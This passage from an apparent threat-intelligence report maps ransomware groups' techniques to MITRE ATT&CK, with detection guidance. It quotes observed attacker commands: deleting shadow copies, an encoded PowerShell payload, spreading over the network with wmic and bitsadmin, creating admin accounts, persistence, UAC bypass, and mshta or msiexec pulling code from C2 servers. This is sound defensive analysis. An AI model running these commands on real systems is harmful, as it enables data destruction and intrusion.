PowerShell: Empire,\nPowersploit.\n\nMajor TTPs overlap with Command and Scripting Interpreter (including\nCommand Shell, PowerShell and Javascript):\n\n### • [Executing shells as in “User Execution: Malicious File T1204.002”]\n • [Proxying execution of malicious content with signed binaries in ]\n“Signed Binary Proxy Execution T1218”\n\n### • [Calling via cmd or PowerShell a huge number of legal utilities for ]\nPersistence, Defense Evasion or Privilege Escalation technique,\nutilities like:\n\n### • [reg.exe]\n • [schtasks.exe]\n • [net.exe]\n • [sc.exe ]\n • [Deobfuscated information;]\n • [Discovery by launching various system utilities such:]\n\n • [arp.exe]\n • [ping.exe]\n • [netstat.exe]\n • [Impact as stopping processes and services, deleting shadow copies, ]\netc.\n\n\n-----\n\noverlap with all TTPs in the Cyber Kill Chain.\n\nGroups such as Conti, Hive, Pysa deploy Empire PowerShell Instances\nand create PowerShell scripts to achieve goals.\n\n**Pysa used an extensive arsenal in PowerShell scripts. Here is one of**\nthem 398B71C2B6B9EF8ABD47DEACE3E844D3:\n\nFig. 9 — Suspicious PowerShell\n\n**BlackByte uses PowerShell for different purposes: Enable Vulnerable**\nProtocols, Deobfuscate/Decode Files or Information, Delete Shadow\ncopies, using WMI-Object for different purposes. As an example,\nseveral command line arguments can be found below:\n```\n                    Command _ line: “C:\\Windows\\System32\\WindowsPowerShell\\\n\n```\nv1.0\\powershell.exe” Enable-WindowsOptionalFeature\n-Online -FeatureName SMB1Protocol\n```\n                    Command _ line: $windir\\$system32\\WindowsPowerShell\\\n\n```\nv1.0\\powershell.exe -command “Set-MpPreference\n-EnableControlledFolderAccess Disabled”\n```\n                    Command _ line: $windir\\$system32\\WindowsPowerShell\\v1.0\\\n\n```\npowershell.exe Install-WindowsFeature -Name \\”RSAT-AD-\n```\n                    PowerShell\\” –IncludeAllSubFeature\n                    Command _ line: $windir\\$system32\\WindowsPowerShell\\v1.0\\\n\n```\npowershell.exe -command “$x = [System.Text.Encoding]\n::Unicode.GetString([System.Convert]::FromBase64String\n(‘RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAg’+’AFcAaQBuAD\nMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkAIAB8AC’+\n’AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAkA’+\n’F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA==’));\nInvoke-Expression $x”\n\n\n-----\n\n##### Conclusion\n\nCommand and Scripting Interpreter technique is used by adversaries\nfor absolutely different scenarios at different stages of the attack,\nfrom launching a phishing email to stopping services. A detailed\ndescription of the encountered Command and Scripting Interpreter\ncan be found in the other techniques sections described in this report.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Execution of Downloaded Powershell Code**\n\n**Appendix#1 - Encoded/decoded PowerShell Сode Execution**\n\n**Appendix#1 - Executing PS1 from Public Directory**\n\n**Appendix#1 - Powershell Suspicious Arguments**\n\n**Appendix#1 - Executing JavaScript from Public Directories**\n\n\n-----\n\nWindows Management Instrumentation T1047 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nWMI is Microsoft’s implementation of WBEM (Web Based Enterprise\nManagement), which is based on CIM and allows remote management\nof multiple system components in Windows environments. WMI is\noften used by system administrators in large domains because of its\nflexibility and scalability. Easy-to-deploy scripts that use WMI can be\nseen everywhere. Ransomware actors also like to use WMI in order to\nachieve their goals:\n\n### • [Use WMI for persistence via Standard Consumer Classes;]\n • [Use PowerShell functionality for interacting with WMI, like Get-]\nWmiObject, Invoke-WmiMethod, etc;\n\n### • [Use wmic.exe for purposes like Defense Evasion, Discovery, ]\nImpact, and many other TTPs. It has a large amount of convenient\ndefault aliases for WMI objects;\n\n### • [Use WMI service for Lateral movement via Distributed ]\nComponent Object Model (DCOM) and Windows Remote\nManagement (WinRM);\n\nThe most common way of using WMI is deleting shadow copies, that is\ntypical for all ransomware groups:\n\nImage _ Path: $windir\\$system32\\wbem\\WMIC.exe\n```\n                    Command _ line: wmic shadowcopy delete\n\n```\nAnother goal is gathering system information. The BlackCat malware\ngets a unique machine identifier (UUID) via a WMIC query to generate\nthe unique payment TOR address for victims:\n\nImage _ Path: $windir\\$system32\\wbem\\WMIC.exe\nCommand _ line: wmic csproduct get UUID\n\n\n-----\n\nterminate processes:\n\nFig. 10 — Pysa PowerShell script fragment\n\nImage _ Path: $windir\\$system32\\wbem\\WMIC.exe\nCommand _ line: “$windir\\$system32\\Wbem\\WMIC.exe”\nprocess where “name like ‘%manage%’” delete\n\nMoreover WMI is used to spread malware over the network. For\nexample, the Conti CobaltStrike beacon was spread via the wmic tool:\n```\n                    Command _ line: wmic /node:<IP _ address> /\n                    user:”<domain>\\<user>” /password:”<password>” process\n\n```\ncall create “cmd /c <cobaltstrike _ path>”\n\nA more complicated way to spread malware was observed in a GERT\ninvestigation with the Hive ransomware. The actors dropped the\nWMI_180.bat file, containing multiple commands which copy an\nexecutable from the “\\\\<xxx>\\share$\\xxx.exe” path to the %APPDATA%\non different systems in the network using WMI and Windows BITS\nservice (list of IP addresses is located in files comps##.txt):\n```\n                    start wmic /node:@C:\\share$\\comps##.txt /user:” <xxx>.\n                    com\\<xxx>” /password:”*********” process call create\n\n```\n“cmd.exe /c bitsadmin /transfer xxx \\\\<xxx>\\share$\\xxx.\nexe %APPDATA%\\xxx.exe&%APPDATA%\\xxx.exe”\n\n##### Conclusion\n\n**SIGMA: (Available in the full version** As we can see, ransomware actors actively use the WMIC tool for\n**of the report in Kaspersky TIP)** different purposes. The usage of detection rules monitoring WMIC\n\n**Appendix#1 - Suspicious Command** suspicious commands and options helps to catch adversaries. The\n**wmic.exe** most important is lateral movement via “wmic /node:...” and deleting\n\n**Appendix#1 - Suspicious Child** shadow copies via “wmic shadowcopy delete”, which clearly illustrate\n**Process Wmiprvse.exe** typical ransomware behaviour.\n\n\n-----\n\n|Col1|Conti|Pysa|Clop (TA505)|Hive|Ragnar Locker|Lockbit|BlackByte|BlackCat|\n|---|---|---|---|---|---|---|---|---|\n|Scheduled Task T1053.005|||||||||\n|Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001|||||||||\n|Account Manipulation T1098|||||||||\n|Create or Modify System Process: Windows Service T1543.003|||||||||\n|BITS Jobs T1197|||||||||\n\n\n## Persistence\n\nRansomware actors try to establish persistence on systems in order\nto preserve access. Persistence tactics consist of various actions,\nfor example to force the ransomware to be launched on boot or logon\nvia Windows Services, Run Keys, Scheduled tasks, to manipulate\naccounts in order to maintain access to the system via compromised\naccounts, etc.\n\nClop Ragnar\nConti Pysa Hive Lockbit BlackByte BlackCat\n(TA505) Locker\n\nScheduled Task\nT1053.005\n\nBoot or Logon\nAutostart\nExecution:\nRegistry Run\nKeys / Startup\nFolder T1547.001\n\nAccount\nManipulation\nT1098\n\nCreate or Modify\nSystem Process:\nWindows Service\nT1543.003\n\nBITS Jobs T1197\n\n\n-----\n\nScheduled Task T1053.005 - 6/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nScheduled Tasks are used by ransomware actors to execute programs\nat system startup or on schedule. The Windows Task Scheduler is\nalso used to remotely run a program that results in spreading over the\nnetwork.\n\n**BlackByte installs a scheduled task (parent image path is specified as**\na REGEDIT tool since BlackByte uses the process hollowing technique\nto hide malware):\n\nImage _ path: “$windir\\\\$system32\\\\schtasks.exe”,\nCommand _ line: “ “$windir\\\\$system32\\\\schtasks.exe /\ncreate /np /sc HOURLY /tn Task /tr \\”$windir\\\\$system32\\\\\ncmd.exe /c for /l %x in (1,1,75) do start wordpad.exe /p\nC:\\\\Users\\\\tree.dll\\” /st 07:00”,\n```\n                    Parent _ image _ path: “$windir\\\\regedit.exe”,\n\n```\nTrickBot RAT used by Conti also installs scheduled tasks. It creates a job:\n\n“$windir\\$system32\\Tasks\\Dogecoin autoupdate#52231” with\n```\n                    its sample and argument “-u”\n\n```\n“$windir\\$system32\\Tasks\\discord autoupdate#10823”\n\nThe name “Dogecoin” and id #52231 are dynamically generated.\n(0dedfa96043208167f8deb5cc652909a)\n\nIn addition, Conti actors install a Cobalt Strike beacon using schtasks.\nexe with option “/s” provided with the target system. This schtasks.exe\noption was used to remotely implement the beacon.\n\nBased on GERT incident investigation, Lockbit creates and executes\nscheduled tasks:\n\n### • [User_userlogon_h for c:\\temp\\v2.exe]\n • [Comp_sys_h for c:\\temp\\v2.exe]\n\n\n-----\n\nCommand _ line: “schtasks /create /sc minute /mo 1 /tn\n```\n                    Server /tr $user\\$temp/Server.exe”\n\n##### Conclusion\n\n```\nInstalling scheduled tasks is one of the popular techniques among\nactors that cannot be ignored. Malware is often located in a public\ndirectory. The detection rule may be built on this pattern. Another\nway to detect suspicious activity with schtasks.exe can be based on\nparent/child process anomalies.\n\n**SIGMA:**\n\n**Appendix#1 - Scheduled Task Start from Public Directory**\n\n**Appendix#1 - Windows Shell Started Schtasks**\n\nBoot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001 - 5/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nRansomware operators usually use the Boot or Logon Autostart\nExecution technique in order to maintain persistence within a victim’s\nenvironment. Installing ransomware as a Registry Run Key or adding it\nto the StartUp folder is as popular as creating scheduled tasks. Many\nransomware samples include this feature.\n\nFor example:\n\n**Lockbit sample adds itself to the registry run key:**\n\nImage _ path: $selfpath\\$selfname.exe\nRegistry _ key: \\REGISTRY\\USER\\$usersid\\Software\\\nMicrosoft\\Windows\\CurrentVersion\\Run\nTarget _ file: $selfpath\\\\$selfname.exe\n\n\n-----\n\nthe Registry StartUp Folder: “\\REGISTRY\\USER\\$usersid\\Software\\\nMicrosoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders”\n\n**RangarLocker sample also creates several registry keys for autostart:**\n\nImage _ path: $selfpath\\$selfname.exe\nRegistry _ key: \\REGISTRY\\USER\\$usersid\\Software\\\nMicrosoft\\Windows\\CurrentVersion\\Run\nTarget _ file: $user\\$temp\\Payload.exe\n```\n                    Image _ path: $user\\$temp\\Payload.exe\n\n```\nRegistry _ key: \\REGISTRY\\USER\\$usersid\\Software\\\nMicrosoft\\Windows\\CurrentVersion\\Run\nTarget _ file: C:\\Users\\[user]\\AppData\\Roaming\\Microsoft\\\nWindows\\Templates\\Windows.URL\n\nAnd then RagnarLocker hides this file:\n```\n                    Image: $system32\\attrib.exe\n\n```\nCommand _ line: attrib +h +r +s “C:\\Users\\[user]\\AppData\\\nLocal\\Temp\\Payload.exe”\nParent _ image _ path: $selfpath\\$selfname.exe\n\nThen it creates an lnk file in the Startup Folder C:\\Users\\[user]\\\nAppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\\nStartup named Windows.lnk with the following target:\n\n### • [“C:\\Users\\[user]\\AppData\\Roaming\\Microsoft\\Windows\\Start ]\nMenu\\Programs\\Startup\\Windows.exe”\n\n### • [Command_line to hide newly created entry: attrib +h +r +s “C:\\]\nUsers\\user001\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\Windows.exe”\n\nAnother sample of RagnarLocker does almost the same:\n\nImage _ path: $selfpath\\$1sass.exe\nRegistry _ key: \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\\nWindows\\CurrentVersion\\Run\nTarget _ file: $windir\\$system32\\$1sass.exe\n\nIn addition, RagnarLocker actors use the Remote Utilities Tool, it was\nalso added to the autorun using the following command:\n\nREG ADD “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\\nRunOnce” /V “Virtual Printer Driver” /t REG _ SZ /F /D\n“”$user\\$appdata\\Macromedia\\Temporary\\WinPrint.exe””\n\n\n-----\n\nrun on system startup (registry keys: \\REGISTRY\\USER\\$usersid\\\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run and \\REGISTRY\\\nMACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\\nCurrentVersion\\Run).\n\nIn addition, Clop (TA505) samples were observed to create a “Java\nupdate.exe” file in the Startup folder $user\\$appdata\\Microsoft\\\nWindows\\Start Menu\\Programs\\Startup\\\n\n##### Conclusion\n\nAdversaries usually add their malware as an entry to the following run\nkeys:\n\n### • [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\]\nCurrentVersion\\Run\n\n### • [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\]\nCurrentVersion\\RunOnce\n\n### • [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\]\nCurrentVersion\\Run\n\n### • [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\]\nCurrentVersion\\RunOnce\n\nAlso, they use the following StartUp folder:\n\n### • [C:\\Users\\[user]\\AppData\\Roaming\\Microsoft\\Windows\\Start ]\nMenu\\Programs\\Startup\\\n\nThere are additional registry keys and other places where actors\ncan locate their payload. In order for these techniques to establish\npersistence using the boot or logon autostart we recommend paying\nattention to programs added from open directories, suspicious\nexecutable file extensions and those masquerading as legitimate\noperating system processes. Of course the best practice would be to\ncheck all programs added to the autorun.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Modification Main Registry Run Keys**\n\n**Appendix#1 - Adding Path of Open Folder in Run Keys via Registry**\n\n**Appendix#1 - Adding Suspicious File in Autorun Keys via Registry**\n\n**Appendix#1 - Suspicious File Creation in Startup Folder**\n\n\n-----\n\nAccount Manipulation T1098 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nAccount manipulation includes changing passwords of compromised\naccounts, adding accounts to groups with higher permissions,\nmodifying password policies and all actions that allow adversaries to\nmaintain access to the system. Upon gaining sufficient permissions,\nthe adversaries create accounts and add them to administrator\ngroups. By dumping existing credentials and getting account access,\nactors may change the password for domain admin accounts in order\nto block response actions.\n\nGERT faced a case where actors just blocked domain users and\nremoved them from the “Domain Admins” group. Considering the\nGERT investigations, we noticed common commands for creating\naccounts and adding them to the Administrators groups:\n\nCommand _ line: “net user xxx [password] /add /\n```\n                    active:yes /expires:never“\n                    Command _ line: “net localgroup administrators xxx /add\n                    “\n\n```\nAdditionally, we saw the following commands for group and account\ndiscovery:\n```\n                    Command _ line: “net group “Enterprise admins” /domain”\n\n```\nCommand _ line: “net group “Domain admins” /domain”\n\nand then adding the created user to the “Domain admins” and\n“Enterprise admins” groups.\n\nSome actors use automatic scripts for account manipulation and\nmodify them during the attack for their goals. For example, analysing\nthe Pysa PowerShell script we see code fragments that for each local\nuser on the local computer adds a new user “[localuser]pysa” and sets\nthe password to “[md5(localuser)][0,12]”\n\n\n-----\n\nFig. 11 — Pysa Suspicious PowerShell\n\n##### Conclusion\n\nMost attacks are accompanied by account manipulations. Threat\nactors need to keep access to the compromised accounts, so they\nmodify credentials and group permissions. In order to detect account\nmanipulation actions, we suggest monitoring the creation of accounts\nand adding accounts to groups. Particularly suspicious are actions\nthat are done through the command line; usually administrators work\nthrough the GUI. Of course, some actions in Account Manipulation\n**T1098 overlap with Create Account T1136 and Account Access**\n**Removal T1531.**\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Account Creation via Powershell**\n\n**Appendix#1 - Account Creation via net.exe**\n\n**Appendix#1 - Adding Account in Domain or Local Admin Group via**\n**net.exe**\n\n**Appendix#1 - Adding Account in Domain or Local Admin Group via**\n**PowerShell**\n\n\n-----\n\nCreate or Modify System Process: Windows Service T1543.003 - 5/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nWindows services are actively used by threat actors to execute\ntheir malicious payload and maintain persistence, as they run in\nthe background. Among the actions of ransomware groups, we\nalso observed the creation of Windows services. Actors include\nmasquerading techniques in the service name or description, to make\nmalware more inconspicuous.\n\nFor example, Chachi RAT, used by Pysa, starts the service with the\nname “JavaJDBC” and description “Oracle JDBC service driver”. It has\nseveral variants:\n\nImage _ path: “$selfpath\\$selfname.exe”,\nService _ name: “JavaJDBC”,\nService _ path: “$selfpath\\\\$selfname.exe”,\n\nImage _ path: “$selfpath\\$selfname.exe”,\n```\n                    Service _ name: “WindowsProtectionSystem”,\n\n```\nService _ path: “”$selfpath\\$selfname.exe””,\n\nFig. 12 — Suspicious Activity: Pysa. Service Creation\n\n\n-----\n\nthe name “SecurityCenterIBM”\n\nUsually, creating a Windows service is accompanied with privilege\nescalation. Windows services are executed with SYSTEM privileges,\nwhile creating them requires administrators rights.\n\nEmpire PowerShell implants that provided the Windows Service\npersistence mechanism were detected on the systems of different\nransomware victims (Conti, Pysa, Clop).\n\nAnalysing ransomware actors, we see active usage of the\npost-exploitation framework CobaltStrike (Conti, Clop, Hive,\n**RagnarLocker). CobaltStrike beacons may be installed as a service**\n(“elevate svc-exe”, “jump psexec”, etc). The typical patterns of\nCobaltStrike services allow us to create a detection rule:\n\nService_path: “%COMSPEC% /b /c start /b /min powershell -nop -w\nhidden -encodedcommand <base64>”\n\nService_path: “\\\\<ip>\\ADMIN$\\xxxxxxx.exe” - Often, 127.0.0.1 as an IP\naddress can be found in the Cobaltstrike service path, where xxxxxxx\nis the randomly named executable of the beacon.\n\n##### Conclusion\n\nUsing Windows services has many advantages for attackers, it\nprovides malware execution, persistence, defense evasion and\nprivilege escalation, so it is very popular among ransomware actors.\nTo detect malicious services created by an attacker, we recommend\nwatching for symptoms that indicate suspicious activity related to\nservices:\n\n### • [the service’s executable file is in an open writeable directory]\n • [the service’s executable is unsigned]\n • [the service itself is created by a user for whom this behaviour is ]\nunusual, etc.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Service Installation From Non-System Directory**\n\n**Appendix#1 - Service Image Path Modification via sc.exe**\n\n\n-----\n\nBITS Jobs T1197 - 2/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nBITS Jobs provide a persistence mechanism in executing payloads.\nBITS Jobs are stored in a database and have no files on the disk or\nregistry values, and are thus perfectly suitable for defense evasion\ntactics.\n\nUsing BITS Jobs is a less popular technique compared to others.\nDespite this, as a couple of actors use this method, we decided to\ninclude it in the report.\n\nFor example, Conti uses it for Lateral Movement\n\nCommand _ line: Bitsadmin /transfer debjob /download \\\\\n\n[localuser]\\C$\\Windows\\[Conti].dll C:\\Windows\\[conti].dll\n\nAccording to a GERT investigation, Hive actors also spread the\nransomware using bitsadmin and then execute it:\n\nCommand _ line: “bitsadmin /transfer xxx \\\\<xxx>\\share$\\\nxxx.exe %APPDATA%\\xxx.exe & %APPDATA%\\xxx.exe”\n\nIn addition the CobaltStrike framework provides an option to use\nbitsadmin to deliver a beacon.\n\n##### Conclusion\n\nIt is difficult to detect malware installed with BITS jobs, but command\n\n**SIGMA: (Available in the full version**\n**of the report in Kaspersky TIP)** line arguments may be used in a detection rule:\n\n**Appendix#1 - File Download via**\n**Bitsadmin**    - [/create]\n\n**Appendix#1 - Suspicious Jobs via**    - [/transfer]\n**Bitsadmin**    - [/download]\n\n\n-----\n\n|Col1|Conti|Pysa|Clop (TA505)|Hive|Ragnar Locker|Lockbit|BlackByte|BlackCat|\n|---|---|---|---|---|---|---|---|---|\n|Abuse Elevation Control Mechanism: Bypass User Account Control T1548.002|||||||||\n|Exploitation for Privilege Escalation T1068|||||||||\n|Access Token Manipulation T1134|||||||||\n\n\n## Privilege Escalation\n\nRansomware actors use multiple techniques to elevate privileges.\nExploiting system misconfigurations and service vulnerabilities is a\ncommon way used by ransomware actors.\n\nClop Ragnar\nConti Pysa Hive Lockbit BlackByte BlackCat\n(TA505) Locker\n\nAbuse Elevation\nControl\nMechanism:\nBypass User\nAccount Control\nT1548.002\n\nExploitation\nfor Privilege\nEscalation T1068\n\nAccess Token\nManipulation\nT1134\n\n\n-----\n\nAbuse Elevation Control Mechanism: Bypass User Account Control T1548.002 - 6/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nFor local privilege escalation, ransomware actors use Cobalt Strike\n(“uac-token-duplication”), PowerShell Empire (“Invoke-BypassUAC.\nps1”) frameworks (Conti, BlackByte, Pysa, Clop). Some actors use a\nnumber of known techniques to bypass UAC.\n\n**Lockbit allocates two undocumented COM objects, CMSTPLUA and**\nColorDataProxy, with elevated privileges. Then Lockbit registers\nitself as a custom display calibrator using those new objects and\nactivates itself. This operation results in a new instance of the Lockbit\nransomware with administrator permissions. This method is also used\nby BlackCat.\n\nCommand _ line: “$windir\\$system32\\DllHost.exe /\nProcessid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}”\nCommand _ line: “$windir\\$system32\\DllHost.exe /\nProcessid:{D2E7041B-2927–42fb-8E9F-7CE93B6DC937}”\n\n{3E5FC7F9-9A51-4367-9063-A120244FBEC7} - CLSID of CMSTPLUA\nCOM Object\n\n{D2E7041B-2927–42fb-8E9F-7CE93B6DC937} - CLSID of\nColorDataProxy COM Object\n\n**BlackByte modifies the following registry key to elevate privileges:**\n\nCommand _ line: “reg add HKLM\\SOFTWARE\\Microsoft\\\n```\n                    Windows\\CurrentVersion\\Policies\\System /v\n\n```\nLocalAccountTokenFilterPolicy /t REG _ DWORD /d 1 /f”\n\n\n-----\n\n##### Conclusion\n\nThere are many approaches to bypass UAC. Updating Windows\nsystems and fixing UAC bypasses will help to mitigate such attacks. It\nwould also be helpful to restrict access rights for users. Rights of local\nadministrators can be handled with the LAPS solution. We provide\nSIGMA rules referring to the examples above in the Appendix.\n\n**SIGMA:**\n\n**Appendix#1 - UAC Bypass via COM Object**\n\n**Appendix#1 - Disabling UAC via Regist**\n\n\n-----\n\nExploitation for Privilege Escalation T1068 - 6/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nAdversaries may get high-level privileges immediately by exploiting\npublic facing web servers for initial access. That’s how BlackByte\nand Hive gain access, using high-privilege exploit vulnerabilities in\nMicrosoft Exchange Server: CVE-2021-34473, CVE-2021-34523, CVE-\n2021-31207.\n\nOther Exchange vulnerabilities have been widely exploited in\nransomware campaigns: CVE-2021-26855, CVE-2021-27065.\n\n**Conti exploited Log4j, PrintNightmare or Zerologon vulnerabilities to**\nescalate privileges.\n\nCVE-2017-0213: Windows COM Elevation of Privilege Vulnerability was\nexploited by RagnarLocker to elevate privileges.\n\n**Clop exploited CVE-2021-27102 in Accellion FTA, which resulted in**\nsystem command execution via a local web service call.\n\n**BlackCat uses CVE-2016-0099, a Secondary Logon Service exploit via**\nCreateProcessWithLogonW() WinAPI.\n\n##### Conclusion\n\nRansomware actors exploit common vulnerabilities to gain higher\nprivileges. Often when a new zero-day vulnerability is discovered,\nattackers begin to actively exploit it. Organisations should have a\nvulnerability management process to explore, remediate, and mitigate\nthem on time. Many vulnerabilities (like PrintNightmare CVE-2021-\n34527) allow code execution, so it is worth looking out for Windows\nshell spawning from atypical or critical Windows processes.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Created Windows Shell from Critical Windows**\n**Process**\n\n\n-----\n\nAccess Token Manipulation T1134 - 5/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nRansomware actors manipulate access tokens to gain higher privileges.\nRansomware Trojans try to obtain SeDebugPrivilege using the\nAdjustTokenPrivilege() WinAPI or abuse the SeImpersonatePrivilege to\nescalate to SYSTEM. This technique is used by Pysa, RagnarLocker,\n**BlackByte, BlackCat, Conti as they adjust access token privileges via**\nWinAPI function AdjustTokenPrivileges():\n\nFig. 13 — Suspicious activity: Access Token Manipulation\n\nAlso the Cobalt Strike framework performs SYSTEM token\nimpersonation via named pipes (“getsystem”).\n\nIn addition, the usage of “Invoke-TokenManipulation” from\nPowersploit and “Get-System” from PowerShell Empire was observed.\n\n##### Conclusion\n\nRansomware actors actively use access token manipulation\ntechniques. One of the protective measures is restricting users to the\nleast privileges they need. If actors use CobaltStrike or PowerShell\nto manipulate tokens, detection rules focusing on the command line\npatterns and suspicious unusual processes initiating a connection to a\npipe can be created.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Get-System Detection (Empire, CobaltStrike,**\n**Metasploit Meterpreter)**\n\n\n-----\n\n## Defense Evasion\n\nRansomware operators use various techniques in an attempt to\nbypass standard security measures, increase their impact, and hide\ntheir activities. They often disable security products and try to hide\nmalware execution by renaming malware, abusing trusted processes\nand obfuscating malicious files. Besides this, ransomware actors take\ncare that their malware does not fall into the hands of cybersecurity\nanalysts; and therefore the sample deletes itself after the attack.\n\n|Col1|Conti|Pysa|Clop (TA505)|Hive|Ragnar Locker|Lockbit|BlackByte|BlackCat|\n|---|---|---|---|---|---|---|---|---|\n|Signed Binary Proxy Execution T1218|||||||||\n|Process Injection T1055|||||||||\n|Impair Defens- es: Disable or Modify Sys- tem Firewall T1562.004|||||||||\n|Impair Defens- es: Disable or Modify Tools T1562.001|||||||||\n|Masquerading T1036|||||||||\n|Indicator Removal on Host: File Deletion T1070.004|||||||||\n|Indicator Removal on Host: Clear Windows Event Logs T1070.001|||||||||\n|Deobfuscate/ Decode Files or Information T1140|||||||||\n\n\nClop Ragnar\nConti Pysa Hive Lockbit BlackByte BlackCat\n(TA505) Locker\n\nSigned Binary\nProxy\nExecution\nT1218\n\nProcess\nInjection\nT1055\n\nImpair Defens-\nes: Disable or\nModify Sys-\ntem Firewall\nT1562.004\n\nImpair Defens-\nes: Disable or\nModify Tools\nT1562.001\n\nMasquerading\nT1036\n\nIndicator\nRemoval on\nHost: File\nDeletion\nT1070.004\n\nIndicator\nRemoval on\nHost: Clear\nWindows\nEvent Logs\nT1070.001\n\nDeobfuscate/\nDecode Files\nor Information\nT1140\n\n\n-----\n\nSigned Binary Proxy Execution T1218 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nRansomware groups use standard Windows utilities (such as rundll32.\nexe, regsvr32.exe, mshta.exe, msiexec.exe, etc.) to avoid application\nrestrictions and bypass AV detection, while downloading/executing\npayloads from the remote attacker servers. This technique is easy to\nautomate. It allows attackers to avoid downloading malware all at once\nand effectively break up the process of installing the malware “kit” into\nstages, reducing the probability of detection.\n\nAs part of its intrusion campaign Pysa leverages mshta.exe to execute\ncode from the C&C server with the following command: “mshta\nhxxp://<ip>:<port>/<resource>”.\n\n**Clop (TA505) uses FLAWEDAMMY RAT as a part of its arsenal. This**\nRAT uses the msiexec.exe utility to download and install next stage\npayload.\n\nFig. 14 — Suspicious activity: Clop. Download via msiexec.exe\n\n\n-----\n\nCommand _ line: $windir\\$system32\\msiexec.exe /q /i\n```\n                    hxxp://<ip>/<resource>\n\n```\nIn order to avoid detection and bypass AV while downloading and\nexecuting malicious payloads Conti also uses Microsoft-signed files:\nmshta.exe and regsvr32.exe:\n\nFig. 15 — Suspicious activities: Conti sample\n\nFig. 16 — Suspicious activity: Conti. regsvr32.exe Fig. 17 — Suspicious activity: Conti. mshta.exe\n\n\n-----\n\nFig. 18 — Suspicious activity: Conti. mshta.exe Fig. 19 — Suspicious activity: Conti. mshta.exe\n```\n                    Image _ path: $windir\\$system32\\mshta.exe\n                    Command _ line: $windir\\$system32\\mshta.exe ‘C:\\Users\\\n\n```\nPublic\\compareForFor.jpg’ {1E460BD7-F1C3-4B2E-88BF-\n4E770A288AF5} {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}\n```\n                    Parent _ image _ path: $windir\\$system32\\cmd.exe\n                    Image _ path: $windir\\$system32\\regsvr32.exe\n                    Command _ line: $windir\\$system32\\regsvr32.exe C:\\Users\\\n\n```\nPublic\\compareForFor.jpg\n```\n                    Parent _ image _ path: $windir\\$system32\\mshta.exe\n\n```\n**SIGMA: (Available in the full version**\n\n##### Conclusion\n\n**of the report in Kaspersky TIP)**\n\n**Appendix#1 - Shell Creation by** This technique mostly refers to the automated part of the infection.\n**Mshta.exe**\n\nTracking suspicious behaviour of the signed binaries, combined with\n\n**Appendix#1 - External HTA File** paying attention to unexpected activities of system processes, should\n**Execution**\n\nhelp identify an attack more quickly.\n\n**Appendix#1 - Executing HTA file**\n**from Public Directory** We highlight the following patterns, which should usually be marked as\n\n**Appendix#1 - Shell Creation by** suspicious:\n**Regsvr32.exe**\n\n1. Signed binary executes something from an external source\n\n**Appendix#1 - External DLL**\n**Execution via Regsvr32.exe** 2. Signed binary executes something from a public directory (i.e. a\n\n**Appendix#1 - Shell Creation by** directory that anybody can write to)\n**Rundll32.exe** 3. Signed binary spawns a shell\n\n**Appendix#1 - External DLL** 4. Signed binary executes a file with unknown or atypical extension\n**Execution via Rundll32**\n\n5. Signed binary executed with suspicious arguments\n\n**Appendix#1 - Suspicious Rundll32.**\n**exe Arguments**\n\n\n-----\n\nProcess Injection T1055 - 5/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • 